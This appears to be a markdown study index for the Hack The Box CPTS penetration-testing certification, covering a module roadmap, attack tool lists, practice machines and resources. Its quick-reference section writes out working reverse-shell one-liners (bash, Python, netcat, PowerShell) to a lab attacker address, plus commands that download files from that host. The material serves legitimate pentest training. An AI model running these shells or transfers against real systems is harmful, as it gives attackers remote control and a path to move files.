# CPTS Master Index

> **Certified Penetration Testing Specialist (CPTS)** — HTB's flagship certification covering modern pentesting methodology, Active Directory attacks, web exploitation, and reporting. Equivalent to OSCP+ but with deeper AD coverage and a report-based exam format.

---

## What is CPTS?

The CPTS certification from Hack The Box validates your ability to:
- Perform full-scope penetration tests across **Linux** and **Windows** environments
- Attack and enumerate **Active Directory** forests (on-prem and hybrid)
- Chain vulnerabilities across **web applications**, **network services**, and **misconfigurations**
- Write professional **penetration test reports**
- Navigate and pivot through segmented networks

**Exam Format:** 10-day lab + 3-day report submission. No multiple choice — pure practical + write-up.

---

## Study Roadmap (Recommended Module Order)

```
Phase 1: Foundations
├── [[00 - Methodology and Workflow/CPTS Methodology|CPTS Methodology]]
├── [[00 - Methodology and Workflow/Quick Reference Card|Quick Reference Card]]
├── [[14 - Common Ports and Services/Port Reference|Port Reference]]
├── Learning Process (HTB Academy)
└── Linux Fundamentals + Windows Fundamentals

Phase 2: Information Gathering
├── Passive Reconnaissance (OSINT, DNS, subdomain enumeration)
├── Active Reconnaissance (Nmap, masscan, rustscan)
├── [[14 - Common Ports and Services/Port Reference|Service Enumeration]]
└── Web Reconnaissance (whatweb, wappalyzer, ffuf)

Phase 3: Vulnerability Assessment
├── Web Vulnerability Scanning
├── Network Vulnerability Scanning
└── Manual Analysis Techniques

Phase 4: Exploitation
├── Web Exploitation (SQLi, XSS, LFI/RFI, SSRF, File Upload)
├── Network Exploitation (Public exploits, Metasploit, manual)
├── Password Attacks (Hydra, john, hashcat, kerberoasting)
└── Active Directory Attacks (BloodHound, Kerberos, ACL abuse)

Phase 5: Post-Exploitation
├── Linux Privilege Escalation
├── Windows Privilege Escalation
├── Linux Persistence
├── Windows Persistence
└── Dumping Credentials (mimikatz, secretsdump, lazagne)

Phase 6: Lateral Movement
├── Pivoting (chisel, sshuttle, ligolo-ng)
├── Tunneling (plink, socat, meterpreter)
├── Pass the Hash / Pass the Ticket
└── Active Directory Lateral Movement

Phase 7: Reporting
├── Report Structure (Executive vs Technical)
├── Finding Write-ups (CVSS scoring, risk ratings)
├── Remediation Recommendations
└── Artifacts and Evidence Collection
```

---

## Domain Index

### [[00 - Methodology and Workflow/CPTS Methodology|Methodology & Workflow]]
- [[00 - Methodology and Workflow/CPTS Methodology|Full Pentesting Methodology]]
- [[00 - Methodology and Workflow/CPTS Exam Checklist|Exam Day Checklist]]
- [[00 - Methodology and Workflow/Quick Reference Card|Quick Reference Card]]
- [[00 - Methodology and Workflow/CPTS Exam Checklist|Pre-Exam Prep]]

### Information Gathering
- Passive Recon: whois, dnsrecon, theHarvester, shodan, google dorks
- Active Recon: [[14 - Common Ports and Services/Port Reference|Nmap scanning]], masscan, rustscan
- Web Recon: whatweb, wappalyzer, ffuf, gobuster, dirsearch
- DNS Enum: dig, nslookup, dnsenum, fierce, sublist3r

### [[14 - Common Ports and Services/Port Reference|Service Enumeration]]
- [[14 - Common Ports and Services/Port Reference|Full Port Reference]]
- SMB: smbclient, crackmapexec, enum4linux, smbmap
- LDAP: ldapsearch, bloodhound-python
- SQL: mssqlclient.py, mysql, psql
- Web: curl, burpsuite, ffuf, nikto
- DNS: dig, dnsrecon, zonetransfer
- SNMP: snmpwalk, snmpcheck, onesixtyone
- RPC: rpcinfo, rpcclient
- WinRM: evil-winrm
- RDP: xfreerdp, rdesktop
- NFS: showmount, mount

### Vulnerability Assessment
- Web Vuln Scan: nikto, wpscan, joomscan, nuclei
- Network Vuln Scan: nmap scripts, nessus (if available)
- Manual Testing: Burp Suite Pro, custom scripts
- API Testing: Postman, curl, custom fuzzing

### Exploitation
- **Web Attacks:**
  - SQL Injection: sqlmap, manual
  - XSS: BeEF, manual injection
  - LFI/RFI: php wrappers, log poisoning
  - SSRF: gopher, file protocol
  - File Upload: reverse shells, webshells
  - Command Injection: commix, manual
- **Network Attacks:**
  - Metasploit Framework
  - Public Exploit Searching: searchsploit, exploit-db
  - Password Spraying / Brute Force
- **Active Directory:**
  - BloodHound / Sharphound
  - Kerberoasting: GetUserSPNs.py, impacket
  - AS-REP Roasting: GetNPUsers.py
  - Kerberos Delegation Abuse
  - ACL Abuse (GenericAll, GenericWrite, WriteOwner)
  - DCSync
  - Golden/Silver Ticket Attacks
  - NTLM Relay
  - AD CS Abuse (ESC1-ESC8)

### Post-Exploitation
- **Linux:**
  - SUID/GUID enumeration
  - Sudo -l abuse
  - Cron job abuse
  - Kernel exploits
  - Capabilities misconfig
  - Docker / LXC escape
  - Automounted shares
- **Windows:**
  - Service misconfigurations
  - Unquoted service paths
  - AlwaysInstallElevated
  - Token privileges (SeImpersonate, SeAssignPrimaryToken)
  - Registry exploits (AutoRun, AlwaysInstallElevated)
  - Credential dumping (SAM, LSASS, NTDS.dit)
  - Potato attacks (Juicy, Sweet, Rogue)
  - Kernel exploits
  - Group Policy abuse
  - Scheduled task abuse

### Lateral Movement
- **Windows:**
  - Pass the Hash (wmiexec, psexec, evil-winrm)
  - Pass the Ticket
  - Overpass the Hash
  - SMB exec / WMI exec
  - WinRM
  - Remote Desktop
  - PsExec
- **Linux:**
  - SSH key theft / reuse
  - SSH pivoting (-D, -L, -R)
  - Port forwarding
- **Pivoting:**
  - Chisel (SOCKS proxy)
  - Ligolo-ng
  - SSHuttle
  - Metasploit pivoting
  - Proxychains
  - Rpivot / SocksOverRDP

### Reporting
- [[00 - Methodology and Workflow/CPTS Methodology|Report Structure]]
- CVSS 3.1 Scoring
- Executive Summary
- Technical Findings
- Evidence Collection (screenshots, logs, commands)
- Remediation Recommendations
- Risk Ratings

---

## Quick Reference

### Essential Nmap Scans
```bash
# Quick sweep
nmap -sn 192.168.1.0/24

# Full port scan (all 65535)
nmap -p- --min-rate=1000 -T4 -Pn -oA fulltcp 10.10.10.10

# Service + Version + Scripts
nmap -p 21,22,80,443,445 -sC -sV -Pn -oA services 10.10.10.10

# UDP Scan
nmap -sU --top-ports 20 -Pn 10.10.10.10

# Vulnerability scripts
nmap -p 445 --script vuln -Pn 10.10.10.10
```

### Common Reverse Shells
```bash
# Bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# NC
nc -e /bin/sh 10.10.14.5 4444

# PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### File Transfer
```bash
# Python HTTP Server
python3 -m http.server 80

# wget (Windows)
certutil -urlcache -f http://10.10.14.5/file.exe file.exe

# wget (Linux)
wget 10.10.14.5/file

# SMB Share
sudo impacket-smbserver share . -smb2support

# Base64 Transfer
base64 -w0 file; echo
echo "BASE64STRING" | base64 -d > file

# Netcat File Transfer
# Receiver: nc -lvnp 4444 > file
# Sender:   nc 10.10.14.5 4444 < file
```

---

## Exam Prep Checklist

- [ ] HTB Academy: Complete all CPTS path modules
- [ ] Practice Boxes: 40+ HTB machines (Easy-Medium)
- [ ] Active Directory: 15+ AD boxes/challenges
- [ ] Web Challenges: SQLi, XSS, LFI, SSRF, SSTI
- [ ] PrivEsc Windows: 30+ practice machines
- [ ] PrivEsc Linux: 30+ practice machines
- [ ] Pivoting Labs: Dante, APT, RastaLabs
- [ ] Write Reports: Minimum 3 full reports
- [ ] BloodHound: Master analysis and attack paths
- [ ] Time Management: Practice 8-hour exam windows
- [ ] Note-Taking: Refined methodology notes
- [ ] Tool Arsenal: Tested and working tool set

### Recommended HTB Machines by Category

| Category | Machines |
|----------|----------|
| **Linux Enum** | Lame, Cronos, Bashed, Nibbles, Shocker, Beep |
| **Linux PE** | LinPEAS, Linux Smart Enumeration, pspy |
| **Windows Enum** | Blue, Devel, Optimum, Bounty, Legacy |
| **Windows PE** | access, grandpa, granny, jail |
| **AD Basics** | Active, Forest, Sauna, Cascade, Fuse |
| **AD Medium** | Intelligence, Sizzle, Reel, Mantis |
| **AD Hard** | Multimaster, Search, BTLO |
| **Web** | Haystack, Poison, Bashed, Drapo, Armageddon |
| **Pivoting** | Dante, APT, RastaLabs |
| **CTF Style** | Tabby, Wall, Ophiuchi, HackTheVote |

### HTB Academy Modules (Priority Order)

1. Penetration Testing Process
2. Network Enumeration with Nmap
3. Attacking Common Services
4. Vulnerability Assessment
5. Web Attacks
6. SQL Injection Fundamentals
7. File Upload Attacks
8. Command Injections
9. Session Security
10. Using the Metasploit Framework
11. Password Attacks
12. Windows Privilege Escalation
13. Linux Privilege Escalation
14. Active Directory LDAP
15. Active Directory Enumeration & Attacks
16. Advanced AD Attacks
17. Kerberos Attacks
18. ADCS Attacks
19. Pivoting, Tunneling, and Port Forwarding
20. Shells & Payloads
21. Documentation & Reporting

---

## Resources

### Tools
- **[[00 - Methodology and Workflow/Quick Reference Card|Quick Reference Card]]** for emergency commands
- **[[14 - Common Ports and Services/Port Reference|Port Reference]]** for service enumeration

### External Resources
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [GTFOBins](https://gtfobins.github.io/)
- [LOLBAS](https://lolbas-project.github.io/)
- [Hack The Box Academy](https://academy.hackthebox.com/)
- [PentesterLab](https://pentesterlab.com/)

*Last Updated: 2026-06-15*
